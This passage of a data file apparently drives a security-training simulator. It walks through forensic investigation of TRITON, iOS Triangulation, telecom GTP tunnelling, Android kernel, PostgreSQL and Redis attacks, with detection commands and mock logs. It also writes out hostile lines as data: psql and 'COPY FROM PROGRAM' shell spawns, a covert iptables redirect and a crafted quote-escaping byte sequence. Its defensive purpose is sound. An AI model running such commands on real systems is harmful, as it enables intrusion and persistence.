          'On the Safety Instrumented System engineering workstation, an unauthorized executable named trilog.exe (compiled with Py2EXE and bundling TS_cnames.py, TsHi.py, TsLow.py, and TsBase.py inside library.zip) is launched to impersonate legitimate Triconex TriStation 1131 diagnostic utilities.',
        activeNodes: ['attacker', 'siem'],
        mitreTactic: 'Defense Evasion (T1036.005 - Masquerading: Match Legitimate Name or Location)',
        technicalCommands: [
          'sigcheck.exe -u -e C:\\Triconex\\Tristation\\trilog.exe',
          'unzip -l C:\\Triconex\\Tristation\\library.zip | grep -E "TsHi|TsLow|TsBase"',
        ],
        defenseMitigation:
          'Isolate Safety Instrumented System (SIS) engineering workstations completely from the Distributed Control System (DCS) and corporate networks, and verify digital signatures on all binaries in C:\\Triconex\\.',
        logs: [
          {
            id: 'ics-triton-1',
            timestamp: '14:20:10.050',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'trilog.exe',
            CommandLine: 'C:\\Triconex\\Tristation\\trilog.exe 10.70.5.10',
            raw: 'EventID=1 Image="C:\\Triconex\\Tristation\\trilog.exe" CommandLine="trilog.exe 10.70.5.10" Signed="false" Description="Py2EXE Bundled TriStation Client"',
            parsedFields: {
              MasqueradedBinary: 'C:\\Triconex\\Tristation\\trilog.exe (Unsigned Py2EXE)',
              BundledPythonModules: 'TsHi.py, TsLow.py, TsBase.py, TS_cnames.py',
              TargetControllerIp: '10.70.5.10',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: TriStation Protocol UDP 1502 Ping & Controller Program Mode Status Check',
        narration:
          'The TsLow.py module transmits a UDP port 1502 TriStation connect/ping packet to the Triconex controller and queries the front-panel keyswitch state, verifying whether the physical keyswitch is left in PROGRAM mode (which permits memory/program modifications).',
        activeNodes: ['attacker', 'firewall', 'target', 'ad'],
        mitreTactic: 'Discovery (T1082 - System Information Discovery / SIS Keyswitch Status)',
        technicalCommands: [
          'tshark -r sis-network.pcap -Y "udp.port == 1502" -T fields -e ip.src -e ip.dst -e data.data',
        ],
        defenseMitigation:
          'Keep Triconex SIS hardware keyswitches locked in RUN mode at all times except during physically supervised maintenance, and monitor hardware keyswitch state telemetry independently.',
        logs: [
          {
            id: 'ics-triton-2',
            timestamp: '14:20:11.320',
            source: 'Network',
            severity: 'high',
            EventCode: 1502,
            ProcessName: 'trilog.exe',
            CommandLine: 'TriStation UDP/1502 Function=GetCpStatus KeyswitchState=PROGRAM',
            raw: 'ot_tristation_log: src=10.70.1.15 dst=10.70.5.10 proto=UDP dst_port=1502 cmd_code=0x06 status="Keyswitch=PROGRAM_MODE"',
            parsedFields: {
              Protocol: 'Triconex TriStation (UDP 1502)',
              CommandCode: 'GetCpStatus (Controller Status Query)',
              KeyswitchPosition: 'PROGRAM Mode (Remote Write Permitted)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: TriStation Program Allocation & Triple-Modular Redundant (TMR) Validation Check',
        narration:
          'When an unauthorized program table modification (inject.bin / imain.bin) is transmitted over UDP 1502, the Triconex Triple-Modular Redundant (TMR) processors compare memory state across the three independent main processor legs and log a diagnostic fault if a validation mismatch occurs.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Persistence (T1542 - Pre-OS Boot / Controller Firmware & Logic Modification)',
        technicalCommands: [
          'snort -c /etc/snort/tristation-cisa-17-356.rules -r sis-network.pcap',
        ],
        defenseMitigation:
          'Deploy CISA ICS-ALERT-17-356-01 Snort/Suricata signatures on all network segments carrying UDP 1502 traffic to detect unauthorized TriStation function codes and MPC860 memory writes.',
        logs: [
          {
            id: 'ics-triton-3',
            timestamp: '14:20:15.804',
            source: 'IDS Alert',
            severity: 'critical',
            EventCode: 35601,
            ProcessName: 'suricata-ics',
            CommandLine: 'ALERT CISA-ICS-17-356-01 TriStation Unauthorized Function Table Write on UDP 1502',
            raw: 'suricata_ics: alert="ET SCADA TRISIS/TRITON TriStation Memory Write Attempt" src=10.70.1.15 dst=10.70.5.10 proto=UDP dport=1502 sid=2025145',
            parsedFields: {
              AlertSignature: 'CISA ICS-ALERT-17-356-01 (TRISIS / TRITON TriStation Write)',
              TargetArchitecture: 'MPC860 PowerPC Triple-Modular Redundant (TMR)',
              TelemetrySource: 'Passive OT Span Port Sensor',
            },
          },
        ],
      },
    ],
  },

  // ============================================================================
  // CATEGORY 3: MOBILE_TELECOM_SPYWARE (Mobile Spyware & Telecom 5G/SS7)
  // ============================================================================
  {
    id: 'mobile-operation-triangulation-ios-shutdown-log-mvt-forensics',
    title: 'Kaspersky GReAT, Citizen Lab & Amnesty MVT — iOS Operation Triangulation Zero-Click iMessage & Shutdown.log Forensics (CVE-2023-41990)',
    category: 'MOBILE_TELECOM_SPYWARE',
    mitreId: 'T1430',
    description:
      'Grounded in Kaspersky GReAT Operation Triangulation research, Apple Security Advisories (CVE-2023-41990 / CVE-2023-32434 / CVE-2023-38606), and Amnesty International Mobile Verification Toolkit (MVT) documentation: mobile DFIR analysts examine iOS sysdiagnose archives (Shutdown.log, DataUsage.sqlite, and CrashReporter plists) to detect zero-click iMessage attachment processing and ephemeral /private/var/tmp/ execution.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Zero-Click iMessage Attachment', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'IMTranscoderAgent / BlastDoor', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'XNU Kernel & MMIO Registers', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Amnesty MVT (mvt-ios) Analyzer', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Shutdown.log & DataUsage.sqlite', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Hidden iMessage Attachment Processing in IMTranscoderAgent & Font Parser Crash Trace',
        narration:
          'When a zero-click iMessage containing a crafted font/image attachment arrives via Apple Push Notification service (apsd), imagent and IMTranscoderAgent process the attachment automatically. Forensic artifacts in CrashReporter and diagnostic logs record abnormal memory faults inside FontParser / CoreGraphics.',
        activeNodes: ['attacker', 'firewall', 'siem'],
        mitreTactic: 'Initial Access (T1456 - Drive-By Compromise / Zero-Click Messaging)',
        technicalCommands: [
          'mvt-ios check-backup --output ./mvt-results ./ios-encrypted-backup/',
          'mvt-ios check-iocs --iocs triangulation.stix2 ./mvt-results/',
        ],
        defenseMitigation:
          'Enable iOS Lockdown Mode on high-risk devices (which blocks complex iMessage attachment pre-processing and disables legacy font parsing in IMTranscoderAgent) and update to patched iOS releases.',
        logs: [
          {
            id: 'mob-tri-1',
            timestamp: '03:14:09.110',
            source: 'Linux Audit',
            severity: 'high',
            EventCode: 41990,
            ProcessName: 'IMTranscoderAgent',
            CommandLine: '/System/Library/PrivateFrameworks/IMTranscoderAgent.framework/IMTranscoderAgent',
            raw: 'mvt_ios_crashlog: process="IMTranscoderAgent" bundle="com.apple.imtranscoding" exception="EXC_BAD_ACCESS" module="libFontParser.dylib" cve_ref="CVE-2023-41990"',
            parsedFields: {
              TargetDaemon: 'IMTranscoderAgent (iMessage Attachment Transcoder)',
              LibraryModule: 'libFontParser.dylib (TrueType ADJUST Instruction)',
              VulnerabilityRef: 'CVE-2023-41990 / CVE-2023-32434',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Ephemeral Implant Execution in /private/var/tmp/ Recorded in iOS Shutdown.log',
        narration:
          'Even though the in-memory implant removes its temporary files from /private/var/tmp/ after execution and does not survive a reboot, the iOS kernel writes every unclosed process PID and path active during system shutdown into /private/var/db/diagnostics/Shutdown.log (extracted from a sysdiagnose archive).',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Defense Evasion (T1070.004 - Indicator Removal: File Deletion / Shutdown.log)',
        technicalCommands: [
          'grep -E "/private/var/tmp/|/private/var/db/" sysdiagnose_extracted/logs/Shutdown/shutdown.log',
        ],
        defenseMitigation:
          'Collect a full iOS sysdiagnose archive prior to wiping a suspected device and run mvt-ios over Shutdown.log to identify processes that executed from /private/var/tmp/.',
        logs: [
          {
            id: 'mob-tri-2',
            timestamp: '03:14:22.500',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 38606,
            ProcessName: 'BackupAgent',
            CommandLine: '/private/var/tmp/main (Recorded in /private/var/db/diagnostics/Shutdown.log)',
            raw: 'ios_shutdown_log: sigterm_timestamp=1763262862 pid=4812 path="/private/var/tmp/main" status="unlinked_executable"',
            parsedFields: {
              ForensicArtifactFile: '/private/var/db/diagnostics/Shutdown.log (sysdiagnose)',
              RecordedProcessPath: '/private/var/tmp/main',
              ForensicSignificance: 'Proves execution of deleted binary from world-writable /private/var/tmp/',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Anomalous System Process Cellular/Wi-Fi Exfiltration in DataUsage.sqlite & netusage.sqlite',
        narration:
          'iOS persistently tracks per-process network byte counters in /private/var/wireless/Library/Databases/DataUsage.sqlite and netusage.sqlite. MVT correlates ZPROCESS entries showing non-networked system daemons (or deleted PIDs) transmitting megabytes of HTTPS data over Wi-Fi/Cellular.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Exfiltration (T1041 - Exfiltration Over C2 Channel)',
        technicalCommands: [
          'sqlite3 DataUsage.sqlite "SELECT ZPROCESS.ZPROCNAME, ZPROCESS.ZBUNDLENAME, ZLIVEUSAGE.ZWIFIIN, ZLIVEUSAGE.ZWIFIOUT FROM ZLIVEUSAGE JOIN ZPROCESS ON ZLIVEUSAGE.ZHASPROCESS = ZPROCESS.Z_PK;"',
        ],
        defenseMitigation:
          'Audit DataUsage.sqlite and netusage.sqlite via MVT for system processes with unexpected outbound byte volumes or missing bundle identifiers.',
        logs: [
          {
            id: 'mob-tri-3',
            timestamp: '03:15:40.012',
            source: 'Network',
            severity: 'critical',
            EventCode: 443,
            ProcessName: 'BackupAgent',
            CommandLine: 'sqlite3 DataUsage.sqlite SELECT ZPROCNAME, ZWIFIOUT FROM ZLIVEUSAGE',
            raw: 'mvt_datausage_sqlite: ZPROCNAME="BackupAgent" ZBUNDLENAME="NULL" ZWIFIOUT=14829402 ZWWANOUT=3104920 first_ts="2026-11-16T03:14:25Z"',
            parsedFields: {
              SqliteDatabase: 'DataUsage.sqlite / netusage.sqlite',
              AnomalousProcessName: 'BackupAgent (ZPROCNAME with NULL Bundle ID)',
              OutboundBytesRecorded: '14.8 MB Wi-Fi / 3.1 MB Cellular',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'telecom-lightbasin-unc1945-gtp-ss7-roaming-forensics',
    title: 'Mandiant UNC1945, CrowdStrike LightBasin & GSMA — Telecom GPRS Tunneling Protocol (GTP) & Roaming Interconnect Forensics',
    category: 'MOBILE_TELECOM_SPYWARE',
    mitreId: 'T1572',
    description:
      'Grounded in Mandiant UNC1945 threat research, CrowdStrike LightBasin analysis, and GSMA FS.11 / FS.19 interconnect security guidelines: telecom SOC analysts investigate unauthorized GPRS Tunneling Protocol (GTP-C UDP port 2123 / GTP-U UDP port 2152) packets traversing the GRX/IPX roaming exchange to reach internal SGSN/GGSN/PGW mobile core nodes.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External GRX/IPX Roaming Peer', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'GTP Border Firewall (:2123/:2152)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'SGSN / GGSN / MME Core Node', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Telecom Signaling IDS & Zeek GTP', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'HLR / HSS Subscriber Database', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Rogue PDP Context Creation Request over GTP-C (UDP Port 2123) on GRX Interface',
        narration:
          'Across the inter-carrier GPRS Roaming Exchange (GRX), an unauthorized peer sends a crafted GTPv1-C Create PDP Context Request (Message Type 16) or GTPv2-C Create Session Request (Message Type 32) on UDP port 2123 targeting the operator GGSN/PGW.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1133 - External Remote Services / GRX GTP Interconnect)',
        technicalCommands: [
          'zeek -C -r grx-interconnect.pcap gtpv1',
          'tshark -r grx-interconnect.pcap -Y "gtp.message == 0x10" -T fields -e ip.src -e ip.dst -e gtp.imsi -e gtp.apn',
        ],
        defenseMitigation:
          'Deploy a GTP Firewall at the GRX/IPX perimeter to validate source GSN IP ranges against official GSMA IR.21 roaming partner tables and block inner-IP spoofing.',
        logs: [
          {
            id: 'tel-gtp-1',
            timestamp: '04:22:10.008',
            source: 'Network',
            severity: 'high',
            EventCode: 2123,
            ProcessName: 'zeek-gtp',
            CommandLine: 'GTPv1-C MessageType=16 (Create PDP Context Request) APN=internet.mnc001.mcc001.gprs',
            raw: 'zeek_gtpv1: ts=1763266930.008 orig_h=198.51.100.44 resp_h=10.90.10.12 resp_p=2123 msg_type="CreatePDPContextRequest" teid=0x00000000 apn="admin.core.gprs"',
            parsedFields: {
              SignalingProtocol: 'GTPv1-C Control Plane (UDP 2123)',
              GtpMessageType: 'Create PDP Context Request (0x10)',
              RequestedApn: 'admin.core.gprs (Internal Management APN)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Encapsulated GTP-U (UDP Port 2152) Inner Packet Routing to Telecom Core Infrastructure',
        narration:
          'Once a Tunnel Endpoint Identifier (TEID) is established, inner IP packets encapsulated inside GTP-U (UDP port 2152) bypass outer perimeter ACLs and route directly to internal OAM (Operations, Administration, and Maintenance) interfaces of mobile core servers.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Command and Control (T1572 - Protocol Tunneling: GTP-U Encapsulation)',
        technicalCommands: [
          'tshark -r grx-interconnect.pcap -Y "gtp.message == 0xff && ip.dst == 10.90.0.0/16" -T fields -e gtp.teid -e ip.src -e ip.dst -e tcp.dstport',
        ],
        defenseMitigation:
          'Inspect inner IP headers of GTP-U (UDP 2152) tunnels at the Gi/SGi interface and strictly prohibit subscriber tunnel traffic from routing to internal OAM or signaling VLANs.',
        logs: [
          {
            id: 'tel-gtp-2',
            timestamp: '04:22:14.319',
            source: 'IDS Alert',
            severity: 'critical',
            EventCode: 2152,
            ProcessName: 'suricata-telecom',
            CommandLine: 'GTP-U (UDP 2152) TEID=0x410082a1 Encapsulated Inner SSH/TCP -> 10.90.20.5:22',
            raw: 'telecom_ids: alert="GSMA-FS19 GTP-U Inner IP Routing to Internal OAM Subnet" outer_src=198.51.100.44 inner_dst=10.90.20.5 inner_dport=22 teid=0x410082a1',
            parsedFields: {
              TunnelProtocol: 'GTP-U User Plane (UDP 2152)',
              TunnelEndpointId: 'TEID 0x410082a1',
              InnerDestination: '10.90.20.5:22 (Internal Core OAM Node)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Custom PAM Module (/lib64/security/pam_unix_auth.so) & iptables Covert Port Rule Audit',
        narration:
          'On the Linux/Solaris mobile core server, forensic inspection of /etc/pam.d/sshd and iptables -t nat -L PREROUTING reveals a modified PAM shared library and a covert PREROUTING port-redirection rule forwarding specific source ports to a hidden listener.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Persistence (T1556.003 - Modify Authentication Process: Pluggable Authentication Modules)',
        technicalCommands: [
          'rpm -Va pam || dpkg --verify libpam-modules',
          'iptables -t nat -L PREROUTING -n -v --line-numbers',
        ],
        defenseMitigation:
          'Run continuous package integrity verification (rpm -Va / AIDE / FIM) over /lib64/security/pam_*.so and audit netfilter/iptables table modifications via auditd syscall rules.',
        logs: [
          {
            id: 'tel-gtp-3',
            timestamp: '04:22:45.102',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'iptables',
            CommandLine: 'iptables -t nat -A PREROUTING -p tcp --sport 33891 -j REDIRECT --to-ports 55221',
            raw: 'type=SYSCALL msg=audit(1763266965.102:704): arch=c000003e syscall=59 success=yes exe="/usr/sbin/iptables" comm="iptables" key="netfilter_mod"',
            parsedFields: {
              NetfilterTable: 'nat PREROUTING',
              CovertRuleTrigger: 'TCP Source Port 33891 -> Local Port 55221',
              ThreatGroupAttribution: 'LightBasin (UNC1945)',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'mobile-android-binder-gpu-selinux-audit-forensics',
    title: 'Google Threat Analysis Group (TAG), Amnesty Tech & Android Security Bulletin — Android Kernel Binder/GPU & SELinux Audit Forensics',
    category: 'MOBILE_TELECOM_SPYWARE',
    mitreId: 'T1404',
    description:
      'Grounded in Google Threat Analysis Group (TAG) Predator/0-day reports, Android Security Bulletins (CVE-2023-4211 / CVE-2023-2136), and Amnesty Tech Android forensic methodology: mobile DFIR analysts inspect Android bugreport archives, logcat kernel ring buffers, SELinux avc: denied audit messages, and /proc/kallsyms / app_process64 execution artifacts.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Sandboxed Browser Renderer', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Binder IPC / Mali GPU Driver', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Android Linux Kernel & SELinux', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'adb bugreport & MVT Android', type: 'siem', status: 'normal' },
      { id: 'ad', label: '/system/bin/app_process64', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Sandboxed isolated_app Renderer ioctl() Calls to /dev/mali0 or /dev/binder',
        narration:
          'A compromised Chrome renderer process running under the restricted u:r:isolated_app:s0 SELinux context invokes ioctl() system calls against /dev/mali0 (GPU driver) or /dev/binder to trigger a kernel use-after-free condition.',
        activeNodes: ['attacker', 'firewall', 'siem'],
        mitreTactic: 'Privilege Escalation (T1404 - Exploitation for Privilege Escalation)',
        technicalCommands: [
          'adb bugreport ./android-bugreport.zip',
          'mvt-android check-bugreport --output ./mvt-android-out ./android-bugreport.zip',
        ],
        defenseMitigation:
          'Apply monthly Android Security Bulletin patches promptly and restrict untrusted isolated_app SELinux domains from opening direct GPU device nodes via seccomp-bpf filters.',
        logs: [
          {
            id: 'mob-and-1',
            timestamp: '08:40:12.019',
            source: 'Linux Audit',
            severity: 'high',
            EventCode: 16,
            ProcessName: 'privileged_proc',
            CommandLine: 'ioctl(/dev/mali0, KBASE_IOCTL_MEM_JIT_INIT) from u:r:isolated_app:s0',
            raw: 'auditd_selinux: type=1400 audit(1763282412.019:219): avc: denied { ioctl } for pid=18492 comm="CrRendererMain" path="/dev/mali0" dev="tmpfs" scontext=u:r:isolated_app:s0 tcontext=u:object_r:gpu_device:s0',
            parsedFields: {
              SourceSelinuxContext: 'u:r:isolated_app:s0 (Browser Renderer Sandbox)',
              TargetDeviceNode: '/dev/mali0 (GPU Kernel Driver)',
              AndroidBulletinRef: 'CVE-2023-4211',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: SELinux Enforcing State & Kernel task_struct Credential Overwrite Telemetry',
        narration:
          'Using arbitrary kernel read/write primitives, the exploit zeroes out the process cred->uid/gid fields and patches selinux_state.enforcing in kernel memory, leaving diagnostic anomalies in dmesg / last_kmsg and auditd state transition logs.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Defense Evasion (T1562.001 - Impair Defenses: Disable or Modify Tools / SELinux)',
        technicalCommands: [
          'grep -E "avc:|selinux_state|enforcing" bugreport-dumpstate_board.txt',
        ],
        defenseMitigation:
          'Leverage hardware-backed Hypervisor Kernel Data Protection (KDP / RKP) to make cred structures and selinux_state read-only in physical RAM.',
        logs: [
          {
            id: 'mob-and-2',
            timestamp: '08:40:13.450',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 1404,
            ProcessName: 'kworker',
            CommandLine: 'dmesg | grep -E "selinux|avc: permissive"',
            raw: 'kernel_log: [ 4120.450112] audit: type=1404 audit(1763282413.450:220): enforcing=0 old_enforcing=1 auid=4294967295 ses=4294967295',
            parsedFields: {
              AuditEventType: 'MAC_STATUS (1404)',
              SelinuxTransition: 'old_enforcing=1 -> enforcing=0 (Runtime Kernel Patch)',
              ForensicSource: 'Android bugreport kernel ring buffer',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Privileged Dalvik/ART Runtime Spawn via /system/bin/app_process64',
        narration:
          'To execute a resident Java/DEX spyware module with root/system privileges without installing a visible APK in PackageManager, the loader spawns /system/bin/app_process64 loading a hidden DEX archive from /data/local/tmp/ or memfd.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1623 - Command and Scripting Interpreter: Unix Shell / app_process64)',
        technicalCommands: [
          'ps -A -o USER,PID,PPID,LABEL,NAME,ARGS | grep app_process64',
        ],
        defenseMitigation:
          'Inspect running processes in Android bugreport dumps for /system/bin/app_process64 instances whose parent PID is not zygote64 or that set CLASSPATH to /data/local/tmp/.',
        logs: [
          {
            id: 'mob-and-3',
            timestamp: '08:40:16.880',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'app_process64',
            CommandLine: 'CLASSPATH=/data/local/tmp/.cache.jar /system/bin/app_process64 /system/bin com.core.service.Main',
            raw: 'bugreport_ps: USER=root PID=18904 PPID=1 LABEL=u:r:su:s0 ARGS="/system/bin/app_process64 /system/bin com.core.service.Main"',
            parsedFields: {
              HostBinary: '/system/bin/app_process64',
              LoadedDexPath: 'CLASSPATH=/data/local/tmp/.cache.jar',
              ParentPidAnomaly: 'PPID=1 (init) instead of zygote64',
            },
          },
        ],
      },
    ],
  },

  // ============================================================================
  // CATEGORY 4: DATABASE_DATA_PLATFORMS (Database Engines & Data Platforms)
  // ============================================================================
  {
    id: 'db-postgresql-psql-utf8-escaping-copy-program-cve-2025-1094',
    title: 'PostgreSQL Security Team, Rapid7 & CISA KEV — PostgreSQL UTF-8 Quote Escaping & COPY FROM PROGRAM Forensics (CVE-2025-1094)',
    category: 'DATABASE_DATA_PLATFORMS',
    mitreId: 'T1190',
    description:
      'Grounded in the PostgreSQL Global Development Group security advisory for CVE-2025-1094, Rapid7 technical analysis, and CISA KEV guidance: database DFIR analysts investigate invalid multi-byte UTF-8 byte sequences in PQescapeStringConn(), interactive psql meta-command (!) execution, and superuser COPY ... FROM PROGRAM shell invocations in PostgreSQL pg_log and Linux auditd.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External App / SQL Client', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'libpq PQescapeStringConn()', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'PostgreSQL Engine (postgres)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'pgAudit & Linux auditd', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'pg_read_server_files / OS Shell', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Invalid UTF-8 Multi-Byte Sequence Discrepancy in libpq PQescapeStringConn()',
        narration:
          'When an application constructs SQL scripts using libpq escaping routines (PQescapeLiteral / PQescapeStringConn) with a multi-byte client encoding such as UTF-8, a crafted trailing byte sequence (0xC0 0x27) causes the escaping routine to consume the single quote as part of a multi-byte character while the parser terminates the string literal.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access (T1190 - Exploit Public-Facing Application / SQL Escaping Flaw)',
        technicalCommands: [
          'psql --version',
          'grep -E "incomplete multibyte character|invalid byte sequence for encoding" /var/log/postgresql/postgresql-16-main.log',
        ],
        defenseMitigation:
          'Upgrade PostgreSQL and libpq to patched releases (17.3, 16.7, 15.11, 14.16, 13.19) and use parameterized prepared statements (PQexecParams) rather than dynamic string concatenation.',
        logs: [
          {
            id: 'db-pg1094-1',
            timestamp: '13:12:04.210',
            source: 'Linux Audit',
            severity: 'high',
            EventCode: 1094,
            ProcessName: 'postgres',
            CommandLine: 'postgres: app_user prod_db 10.10.4.22(51204) PARSE/QUERY',
            raw: 'pg_log: 2026-11-16 13:12:04.210 UTC [4912] app_user@prod_db ERROR: invalid byte sequence for encoding "UTF8": 0xc0 0x27',
            parsedFields: {
              DatabaseEngine: 'PostgreSQL 16 (libpq PQescapeStringConn)',
              EncodingError: 'invalid byte sequence for encoding "UTF8": 0xc0 0x27',
              AdvisoryId: 'CVE-2025-1094',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Interactive psql Meta-Command (! /bin/sh) or Stacked SQL Statement Execution',
        narration:
          'When the escaped output is fed into an interactive psql batch pipeline, breaking out of the single-quoted literal allows injection of the psql ! meta-command (which spawns a local shell as the psql client user) or stacked SQL statements.',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1059.004 - Command and Scripting Interpreter: Unix Shell)',
        technicalCommands: [
          'ausearch -pp $(pgrep psql) -m SYSCALL -sv yes',
        ],
        defenseMitigation:
          'Pass the --no-psqlrc and -v ON_ERROR_STOP=1 flags when running automated psql scripts, and avoid piping untrusted SQL strings into interactive psql sessions.',
        logs: [
          {
            id: 'db-pg1094-2',
            timestamp: '13:12:05.088',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'psql',
            CommandLine: '/bin/sh -c id; hostname',
            raw: 'type=SYSCALL msg=audit(1763298725.088:811): arch=c000003e syscall=59 success=yes ppid=4901 pid=4918 exe="/usr/bin/dash" comm="sh" key="psql_meta_cmd"',
            parsedFields: {
              ParentProcess: 'psql (Interactive SQL Batch Client)',
              MetaCommandTriggered: '\\! /bin/sh -c "id; hostname"',
              Syscall: 'sys_execve (59)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Database Engine COPY ... FROM PROGRAM OS Command Execution & pgAudit Detection',
        narration:
          'On the PostgreSQL database server itself, if the session holds superuser or pg_execute_server_program privileges, executing COPY cmd_out FROM PROGRAM spawns /bin/sh directly as the postgres operating system account, logged deterministically by pgAudit DDL/MISC auditing.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1203 - Exploitation for Client/Server Execution / COPY FROM PROGRAM)',
        technicalCommands: [
          'COPY pg_temp_audit FROM PROGRAM \'id > /tmp/pg_audit_check\';',
          'grep "COPY.*FROM PROGRAM" /var/log/postgresql/postgresql-16-main.log',
        ],
        defenseMitigation:
          'Enable the pgAudit extension (pgaudit.log = \'all\'), revoke superuser and pg_execute_server_program roles from application accounts, and alert on any postgres child process spawning /bin/sh.',
        logs: [
          {
            id: 'db-pg1094-3',
            timestamp: '13:12:08.512',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 5432,
            ProcessName: 'postgres',
            CommandLine: 'COPY pg_temp_audit FROM PROGRAM \'id > /tmp/pg_audit_check\';',
            raw: 'pgaudit_log: AUDIT: SESSION,1,1,MISC,COPY,,,COPY pg_temp_audit FROM PROGRAM \'id > /tmp/pg_audit_check\';,<none>',
            parsedFields: {
              PgAuditClass: 'MISC / COPY FROM PROGRAM',
              DatabaseRole: 'postgres / pg_execute_server_program',
              SpawnedChildShell: '/bin/sh -c id > /tmp/pg_audit_check',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'db-redis-lua-sandbox-debian-liblua-cve-2022-0543',
    title: 'Debian DSA-5081, NIST NVD & CISA KEV — Redis Lua Sandbox package.loadlib Escape & ReplicaOf Forensics (CVE-2022-0543)',
    category: 'DATABASE_DATA_PLATFORMS',
    mitreId: 'T1190',
    description:
      'Grounded in Debian Security Advisory DSA-5081, NIST NVD CVE-2022-0543, and CISA KEV guidance: DFIR analysts investigate unauthenticated or SSRF-relayed Redis EVAL Lua scripts that abuse the dynamically linked Debian/Ubuntu package table (package.loadlib) to load luaopen_io from liblua5.1.so.0 and execute OS commands under the redis service account.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Remote Client / SSRF Relay', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Redis TCP Port 6379 Listener', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Embedded Lua 5.1 Engine', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Redis MONITOR & Linux auditd', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'liblua5.1.so.0 (luaopen_io)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unauthenticated Redis Port 6379 Connection & INFO Server Enumeration',
        narration:
          'When redis-server is bound to 0.0.0.0:6379 without protected-mode or requirepass authentication (or reached via an internal SSRF pivot), the client sends the INFO server command to identify the underlying Linux distribution (os:Linux ... Debian/Ubuntu) and Redis version.',
        activeNodes: ['attacker', 'firewall', 'siem'],
        mitreTactic: 'Discovery (T1046 - Network Service Discovery / Redis Port 6379)',
        technicalCommands: [
          'redis-cli -h 10.10.30.40 -p 6379 INFO server',
          'grep -E "^bind|^protected-mode|^requirepass" /etc/redis/redis.conf',
        ],
        defenseMitigation:
          'Bind Redis exclusively to loopback/private interfaces (bind 127.0.0.1), enforce protected-mode yes and ACL passwords, and rename dangerous commands (EVAL, CONFIG, MODULE) in redis.conf.',
        logs: [
          {
            id: 'db-redis-1',
            timestamp: '15:04:11.090',
            source: 'Network',
            severity: 'high',
            EventCode: 6379,
            ProcessName: 'redis-server',
            CommandLine: 'redis-cli -h 10.10.30.40 -p 6379 INFO server',
            raw: 'redis_slowlog: client=10.10.4.19:48102 cmd="INFO" args="server" os="Linux 5.10.0-11-amd64 x86_64 Debian"',
            parsedFields: {
              ServiceEndpoint: 'TCP 10.10.30.40:6379 (redis-server)',
              CommandExecuted: 'INFO server',
              DetectedDistribution: 'Debian / Ubuntu Dynamic Lua Build',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Redis EVAL Lua Script Invoking package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io")',
        narration:
